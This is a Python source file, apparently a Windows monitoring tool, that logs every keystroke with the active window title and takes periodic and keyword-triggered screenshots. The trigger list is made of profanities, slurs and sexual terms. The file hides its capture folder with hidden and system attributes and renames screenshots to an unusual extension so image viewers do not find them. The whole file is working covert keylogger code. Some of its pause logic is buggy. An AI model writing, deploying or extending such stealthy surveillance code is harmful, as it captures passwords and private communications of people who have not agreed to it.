import os
import shutil
from os import path
import autopy
import datetime
from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
#from configparser import ConfigParser

#parser = ConfigParser()
#parser.read('sysconfig.ini')

__version__ = '2.1.1'       # parser.get('System Configuration', 'version')
key_counter = 100           # parser.getint('System Configuration', 'key_counter')     # Number of characters to capture before writing to the file
screen_timer = 10           # parser.getint('System Configuration', 'screen_timer')   # Amount of time in seconds before the screen is captured
exit_string = '<192>'       # parser.get('System Configuration', 'exit_string')     # Key combinations to exit program --  <192> is ctrl key + `
pause_string = '<190>'      # Key combination to pause recording activities <111> is ctrl + .
resume_string = '<191>'     # Key combination to resume recording activities <222> is ctrl + ?
pause_recording = False


save_path = 'c:\syscapture'  # parser.get('Files', 'save_path')
log_file_name = 'syscapture.txt'          # parser.get('Files', 'log_file_name')

count = 0
png_count = 0
storedTime = datetime.datetime.utcnow()
storedWindow = GetWindowText(GetForegroundWindow())
keys = []
keys_to_write = ""
keys_captured = []
error_logfile = "c:\sys_error_log.txt"

keywords = ["anal", "anus", "arse", "ass", "ass fuck", "ass hole", "assfucker", "asshole", "assshole", "bastard",
            "bitch", "black cock", "bloody hell", "boong", "cock", "cockfucker", "cocksuck", "cocksucker", "coon",
            "coonnass", "crap", "cunt", "cyberfuck", "damn", "darn", "dick", "dirty", "douche", "dummy", "erect",
            "erection", "erotic", "escort", "fag", "faggot", "fuck", "Fuck off", "fuck you", "fuckass", "fuckhole",
            "god damn", "gook", "hard core", "hardcore", "homoerotic", "hore", "lesbian", "lesbians", "mother fucker",
            "motherfuck", "motherfucker", "negro", "nigger", "orgasim", "orgasm", "penis", "penisfucker", "piss",
            "piss off", "porn", "porno", "pornography", "pussy", "retard", "sadist", "sex", "sexy", "shit", "slut",
            "son of a bitch", "suck", "tits", "viagra", "whore", "xxx"]

replacementkeydict = {"Key.space": " ",
                      "Key.enter": " <enter> ",
                      "Key.shift": "",
                      "Key.shift_r": "",
                      "Key.backspace": "",
                      "Key.alt_l": " <alt left> ",
                      "Key.alt_r": " <alt right> ",
                      "Key.delete": " <del> ",
                      "Key.tab": " <tab> ",
                      "Key.ctrl_l": " ",
                      "Key.right": " <Arrow_Right> ",
                      "Key.left": " <Arrow_Left> ",
                      "Key.up": " <Arrow_Up> ",
                      "Key.down": " <Arrow_Down> ",
                      "Key.caps_lock": " <caps_lock> ",
                      "Key.media_volume_up": " <Volume Up> ",
                      "Key.media_volume_down": " <Volume Down> "}


def write_file(keys_captured):
    global storedWindow, exit_string, error_logfile, pause_recording
    keys_to_write = ""

    if not pause_recording:
        if not os.path.exists(save_path):
            os.mkdir(save_path)
            os.system('attrib +h +s ' + save_path)

        # Will create the file if it does not exist otherwise append
        try:
            with open(os.path.join(save_path, log_file_name), 'a+') as f:

                f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\t")

                checkNaughtyList(keys_captured)  # will update keys_captured list with notes if something is found

                if len(keys_captured) != 0:
                    # Convert keys_captured to string in preparation to be written to a file
                    for each_key in keys_captured:
                        keys_to_write += each_key

                f.write(keys_to_write)
                f.write("\n")
        except Exception as e:
            with open(error_logfile, 'a') as f:
                f.write('an error message')
        finally:
            keys.clear()  # Reset the key list


def checkNaughtyList(keys_list):
    global keys_captured
    keystring = ""


    if len(keys_list) != 0:
        for each_key in keys_list:
            keystring += each_key
        #wordlist = keystring.split()

    # Check keys entered against the list of keywords... if found take copy screen
    if any(x in keystring.split() for x in keywords):
        keys.append(" <KEYWORD-FOUND> ")  # global variable is updated with any notes
        write_screen()


def write_screen():
    global png_count, save_path, log_file_name, storedTime, pause_recording

    if not pause_recording:
        img = autopy.bitmap.capture_screen()
        png_count += 1

        formatted_time = datetime.datetime.strptime((storedTime.strftime("%Y-%m-%d %H:%M:%S.%f"))[:-7], "%Y-%m-%d %H:%M:%S")
        img_file_name = str(formatted_time).replace(":", ".") + "_%s.png" % png_count

        try:
            # img_file_and_path = os.path.join(save_path, log_file_name)
            img.save(os.path.join(save_path, img_file_name))
        except IOError:
            print("IOError with image")
        except ValueError:
            print("ValueError with image")

        # Reset the screen_timer each time the screen is saved
        storedTime = datetime.datetime.utcnow()
        # Todo validate timestamps are working correctly

        try:
            # rename so image viewers don't find it by scanning drives for image files
            if path.exists(os.path.join(save_path, img_file_name)):
                newname = (os.path.join(save_path, img_file_name)[:-3] + "pnx")
                shutil.move(os.path.join(save_path, img_file_name), newname)  # Renames the file

        except OSError:
            print("OSError renaming file")
        except ValueError:
            print("ValueError renaming file")


def on_press(key):
    global keys, count, storedTime, screen_timer, key_counter, storedWindow, png_count, keywords, replacementkeydict
    global resume_string
    replacementkey = ""

    # Check to see if there are any alternate replacement text upon key detection
    try:
        replacementkey = replacementkeydict[str(key)]
        # Todo Fix delete key function
        keys.append(replacementkey)
    except KeyError:
        # keystroke not found in key replacement dictionary so just add the key to the keys list
        keys.append((str(key).replace("'", "")))

    # Check for exit key combinations
    if exit_string in str(keys):
        keys.append("\n\n")
        write_file(keys)            # write any extra keys before exiting
        write_file(["Exit Keys Detected -- Normal System Exit"])
        return False

    if pause_string in str(keys):
        keys.append("\n\n")
        write_file(keys)  # write any extra keys before exiting
        write_file(["Pause Keys Detected -- Captures Halted"])
        pause_recording = True

    if resume_string in str(keys):
        pause_recording = False
        write_file(keys)  # write any extra keys before exiting
        write_file(["Resume Keys Detected -- Captures Resumed"])



    # Check the Naughty Word List when a space is used.  Only makes sense after a space because we're looking for words
    # not individual characters.  I'm defining a word as a string of characters separated by one or more spaces
    if replacementkey == " ":
        checkNaughtyList(keys)

    if len(keys) >= key_counter:
        write_file(keys)

    # Capture Screen interval based on configured 'screen_timer' delay in seconds
    s = storedTime.strftime("%Y-%m-%d %H:%M:%S.%f")
    storedtime_plus_delay = (datetime.datetime.strptime(s[:-7], "%Y-%m-%d %H:%M:%S")) + datetime.timedelta(seconds=screen_timer)

    if datetime.datetime.utcnow() >= storedtime_plus_delay:
        write_screen()

    # check the active window to see if we are still typing in the same application
    # between keystrokes.  Otherwise there is a chance that the application name would not get logged depending
    # on the write_delay
    # if the application focus changes, grab the screen
    if GetWindowText(GetForegroundWindow()) != storedWindow:
        keys.insert(0, ("\n\n<application> " + str(GetWindowText(GetForegroundWindow()) + " <application> ")))
        # write_file will wipe out the keys, so sending keys here to log before writing the new window name
        write_file(keys)
        storedWindow = GetWindowText(GetForegroundWindow())  # update storedWindow to the new name of the application

        write_screen()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


